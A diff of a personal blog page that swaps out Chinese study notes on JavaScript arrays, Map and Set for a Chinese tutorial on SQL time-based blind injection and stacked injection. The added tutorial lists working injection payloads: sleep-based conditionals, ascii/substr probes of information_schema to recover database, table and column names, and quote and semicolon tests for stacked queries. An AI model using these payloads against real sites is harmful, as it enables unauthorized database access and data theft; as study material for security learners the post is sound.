@@ -4,11 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="JavaScript拓展（3）, Robin">
-    <meta name="description" content="每日一记数组数组（Array）能存储有序的集合
-声明:
-let arr = new Array();
-let fruits = [&amp;quot;Apple&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;Plum&amp;quot;">
+    <meta name="keywords" content="SQL时间注入&amp;堆叠注入, Robin">
+    <meta name="description" content="SQL时间注入表现无论输入什么都会返回正常的处理信息或者页面无回显能依靠自身感知到页面的延时情况
+原理前端在将数据传给后台时，设置了一个if语句当条件为真时执行sleep语句，条件为假时无执行语句
+思路时间注入又称延时注入，与布尔盲注同属于">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +19,7 @@ let fruits = [&amp;quot;Apple&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;P
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>JavaScript拓展（3） | Robin</title>
+    <title>SQL时间注入&amp;堆叠注入 | Robin</title>
     <link rel="icon" type="image/png" href="../../../../favicon.png">
     
     <style>
@@ -346,12 +345,12 @@ let fruits = [&amp;quot;Apple&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;P
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">JavaScript拓展（3）</h1>
+                    <h1 class="description center-align post-title">SQL时间注入&amp;堆叠注入</h1>
                 </div>
             </div>
         </div>
@@ -398,28 +397,28 @@ let fruits = [&amp;quot;Apple&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;P
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-08
+                    2023-03-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-03
+                    2023-03-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.1k
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    3 分
                 </div>
                 
 
@@ -439,67 +438,59 @@ let fruits = [&amp;quot;Apple&amp;quot;, &amp;quot;Orange&amp;quot;, &amp;quot;P
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组（Array）能存储有序的集合</p>
-<p>声明:</p>
-<pre><code>let arr = new Array();
-let fruits = [&quot;Apple&quot;, &quot;Orange&quot;, &quot;Plum&quot;];
-重新定义就能更改value
-增加array只需要定义新位置
-fruits.length是元素的个数
-以逗号结尾
-</code></pre>
-<p>查找:<br>fruits[fruits.length - 1]&lt;因为方括号中的索引是被按照其字面意思处理的&gt;<br>fruits.at(-1)<br>不能用fruits[-1]查找元素,结果是 undefined</p>
-<p>更改:<br>push 在末端添加一个元素<br>pop 从末端取出并删除一个元素<br>unshift 在数组的首端添加元素<br>shift 取出队列首端的一个元素，整个队列往前移，这样原先排第二的元素现在排在了第一个<br>(push 和 unshift 方法都可以一次添加多个元素)<br>push/pop 方法运行的比较快，而 shift/unshift 比较慢</p>
-<p>slice:<br>arr.slice([start], [end])<br>返回一个新数组，将所有从索引 start 到 end（不包括 end）的数组项复制到一个新的数组。start 和 end 都可以是负数，在这种情况下，从末尾计算索引</p>
-<p>splice:<br>arr.splice(start[, deleteCount, elem1, …, elemN])<br>从索引 start 开始修改 arr：删除 deleteCount 个元素并在当前位置插入 elem1, …, elemN。最后返回被删除的元素所组成的数组</p>
-<p>concat:<br>arr.concat(arg1, arg2…)<br>创建一个包含来自于 arr，然后是 arg1，arg2 的元素的新数组。<br>如果参数 argN 是一个数组，那么其中的所有元素都会被复制。否则，将复制参数本身。<br>如果类数组对象具有 Symbol.isConcatSpreadable 属性，那么它的元素就会被添加</p>
-<p>遍历:<br>for..of 不能获取当前元素的索引，只是获取元素值<br>for..in 会遍历所有属性，不仅仅是数字属性，而且不适用于数组，因此速度要慢<br>forEach 允许为数组的每个元素都运行一个函数</p>
-<p>关于 “length”:<br>不是数组里元素的个数，而是最大的数字索引值加一<br>通过减少length来截断数组，但length恢复后数组不会恢复<br>清空数组最简单的方法就是：arr.length = 0;</p>
-<p>new Array():<br>创建一个指定了长度，却没有任何项的数组</p>
-<p>多维数组:<br>matrix[1][1]最中间的那个数</p>
-<p>toString:<br>返回以逗号隔开的元素列表</p>
-<p>使用 == 比较数组:<br>1.仅当两个对象引用的是同一个对象时，它们才相等 ==<br>2.如果 == 左右两个参数之中有一个参数是对象，另一个参数是原始类型，那么该对象将会被转换为原始类型<br>3.……null 和 undefined 相等 ==，且各自不等于任何其他的值</p>
-<p>在数组中搜索:<br>arr.indexOf(item, from);<br>从索引 from 开始搜索 item，如果找到则返回索引，否则返回 -1。<br>arr.includes(item, from);<br>从索引 from 开始搜索 item，如果找到则返回 true（没找到则返回 false）。<br>alert( fruits.lastIndexOf(‘Apple’) );<br>与 indexOf 相同，但从右向左查找<br>arr.find(function(item, index, array);<br>item 是元素。index 是它的索引。array 是数组本身。<br>如果返回 true，则返回 item 并停止迭代;对于假值，则返回 undefined<br>arr.filter(function(item, index, array);<br>如果 true item 被 push 到 results，迭代继续;如果什么都没找到，则返回空数组<br>indexOf 和 includes 使用严格相等 === 进行比较。所以，搜索 false时会准确找到 false 而不是数字 0<br>includes可以正确处理 NaN</p>
-<p>转换数组:<br>arr.map(function(item, index, array)<br>对数组的每个元素都调用函数，并返回结果数组<br>arr.sort();<br>默认情况下被按字符串进行排序<br>arr.sort(compareNumeric);<br>按数字进行排序<br>arr.reverse();<br>倒序</p>
-<p>分割粘合数组:<br>let arr = names.split(‘, ‘,2);<br>将字符串分割成一个个数组,限制数组长度为2,额外的元素会被忽略<br>str.split(‘’);<br>将字符串拆分为字母数组<br>arr.join(‘;’);<br>根据;粘合数组</p>
-<p>从数组中区分出普通对象:<br>Array.isArray({})<br>如果 value 是一个数组，则返回 true；否则返回 false。</p>
-<h4 id="Iterable-object（可迭代对象）"><a href="#Iterable-object（可迭代对象）" class="headerlink" title="Iterable object（可迭代对象）"></a>Iterable object（可迭代对象）</h4><p>可以应用 for..of 的对象被称为 可迭代的。<br>技术上来说，可迭代对象必须实现 Symbol.iterator 方法。<br>obj[Symbol.iterator].() 的结果被称为迭代器（iterator）。由它处理进一步的迭代过程。<br>一个迭代器必须有 next() 方法，它返回一个 {done: Boolean, value: any} 对象，这里 done:true 表明迭代结束，否则 value 就是下一个值。<br>Symbol.iterator 方法会被 for..of 自动调用，但我们也可以直接调用它。<br>内建的可迭代对象例如字符串和数组，都实现了 Symbol.iterator。<br>字符串迭代器能够识别代理对。<br>有索引属性和 length 属性的对象被称为 类数组对象。这种对象可能还具有其他属性和方法，但是没有数组的内建方法。<br>如果我们仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是“真正的”数组，因为这样抽象度更高。<br>Array.from(obj[, mapFn, thisArg]) 将可迭代对象或类数组对象 obj 转化为真正的数组 Array，然后我们就可以对它应用数组的方法。可选参数 mapFn 和 thisArg 允许我们将函数应用到每个元素。</p>
-<h4 id="Map-and-Set（映射和集合）"><a href="#Map-and-Set（映射和集合）" class="headerlink" title="Map and Set（映射和集合）"></a>Map and Set（映射和集合）</h4><p>Map 是一个带键的数据项的集合，就像一个 Object 一样。 但是它们最大的差别是 Map 允许任何类型的键（key）。</p>
-<pre><code>Map
-new Map() —— 创建 map。
-map.set(key, value) —— 根据键存储值。
-map.get(key) —— 根据键来返回值，如果 map 中不存在对应的 key，则返回 undefined。
-map.has(key) —— 如果 key 存在则返回 true，否则返回 false。
-map.delete(key) —— 删除指定键的值。
-map.clear() —— 清空 map。
-map.size —— 返回当前元素个数。
+                <h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p>
+<h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回c
+sleep(x)                 延时x秒
+if(a,b,c)                a为真，执行b；否则执行c
+benchmark(a,b)           a为操作次数，b为执行的函数
+                         原理是通过多次操作，让极短暂的延时增加到能识别的程度
+                         后面几个都是这种思想
+笛卡尔积                  别问，老子离散数学还没学到这！
+get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间
+                         前提条件是数据库连接是长连接
+正则bug                  利用大量正则计算延长时间，实现延时
 
-Map 迭代
-map.keys() —— 遍历并返回一个包含所有键的可迭代对象，
-map.values() —— 遍历并返回一个包含所有值的可迭代对象，
-map.entries() —— 遍历并返回一个包含所有实体 [key, value] 的可迭代对象，for..of 在默认情况下使用的就是这个。
+除此之外还有
+case … when … then … else … end
 </code></pre>
-<p>Object.entries：从对象创建 Map<br>let map = new Map(Object.entries(obj));<br>Object.fromEntries：从 Map 创建对象<br>let obj = Object.fromEntries(map.entries()); // 创建一个普通对象（plain object）(*)</p>
-<pre><code>Set
-new Set(iterable) —— 创建一个 set，如果提供了一个 iterable 对象（通常是数组），将会从数组里面复制值到 set 中。
-set.add(value) —— 添加一个值，返回 set 本身
-set.delete(value) —— 删除值，如果 value 在这个方法调用的时候存在则返回 true ，否则返回 false。
-set.has(value) —— 如果 value 在 set 中，返回 true，否则返回 false。
-set.clear() —— 清空 set。
-set.size —— 返回元素个数。
+<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1
+?id=5
+?id=5&#39;
+?id=5&quot;
+?id=5 and 1=1
+?id=5 and 1=2
+</code></pre>
+<p>如果页面显示结果一样，那就说明可能是延时注入</p>
+<h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)
+?id=1 and if(length(database())=4,sleep(5),1)
+</code></pre>
+<p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p>
+<h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名
+?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)
+测试表数量
+?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5
+测试第一张表长度
+?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10
+测试表名
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100
+测试表中字段数量
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5
+测试字段内容
+?id=1 and (select count(name) from users)=4
+</code></pre>
+<p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p>
+<h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p>
+<h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;
+?id=1&#39; and 1=1--+
+?id=1&#39; and 1=2--+
+</code></pre>
+<h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p>
+<h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p>
+<p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>
 
-Set 迭代（iteration）
-set.keys() —— 遍历并返回一个包含所有值的可迭代对象，
-set.values() —— 与 set.keys() 作用相同，这是为了兼容 Map，
-set.entries() —— 遍历并返回一个包含所有的实体 [value, value] 的可迭代对象，它的存在也是为了兼容 Map。
-</code></pre>
-<h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象与其关联值一同删除。</p>
-<p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象删除。</p>
-<p>它们的主要优点是它们对对象是弱引用，所以被它们引用的对象很容易地被垃圾收集器移除。</p>
-<p>这是以不支持 clear、size、keys、values 等作为代价换来的……</p>
-<p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么该对象将被自动清除。</p>
-<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>JSON 是一种数据格式，具有自己的独立标准和大多数编程语言的库。<br>JSON 支持 object，array，string，number，boolean 和 null。<br>JavaScript 提供序列化（serialize）成 JSON 的方法 JSON.stringify 和解析 JSON 的方法 JSON.parse。<br>这两种方法都支持用于智能读/写的转换函数。<br>如果一个对象具有 toJSON，那么它会被 JSON.stringify 调用。</p>
-<h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="今天就想说一句-我这是学js上头了嘛，为啥学这么细……"><a href="#今天就想说一句-我这是学js上头了嘛，为啥学这么细……" class="headerlink" title="今天就想说一句:我这是学js上头了嘛，为啥学这么细……"></a>今天就想说一句:我这是学js上头了嘛，为啥学这么细……</h5>
                 
             </div>
             <hr/>
@@ -597,13 +588,13 @@ set.entries() —— 遍历并返回一个包含所有的实体 [value, value] �
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="../../09/20221109/">
+                <a href="../../13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/14.jpg" class="responsive-img" alt="JavaScript深入了解">
+                        <img src="../../../../medias/featureimages/8.jpg" class="responsive-img" alt="SQL二次注入">
                         
-                        <span class="card-title">JavaScript深入了解</span>
+                        <span class="card-title">SQL二次注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -614,7 +605,7 @@ set.entries() —— 遍历并返回一个包含所有的实体 [value, value] �
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-09
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-13
                         </span>
                         <span class="publish-author">
                             
@@ -646,13 +637,13 @@ set.entries() —— 遍历并返回一个包含所有的实体 [value, value] �
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="../../07/20221107/">
+                <a href="../SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/0.jpg" class="responsive-img" alt="JavaScript拓展（2）">
+                        <img src="../../../../medias/featureimages/1.jpg" class="responsive-img" alt="SQL报错注入">
                         
-                        <span class="card-title">JavaScript拓展（2）</span>
+                        <span class="card-title">SQL报错注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -663,7 +654,7 @@ set.entries() —— 遍历并返回一个包含所有的实体 [value, value] �
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-12
                             </span>
                         <span class="publish-author">
                             
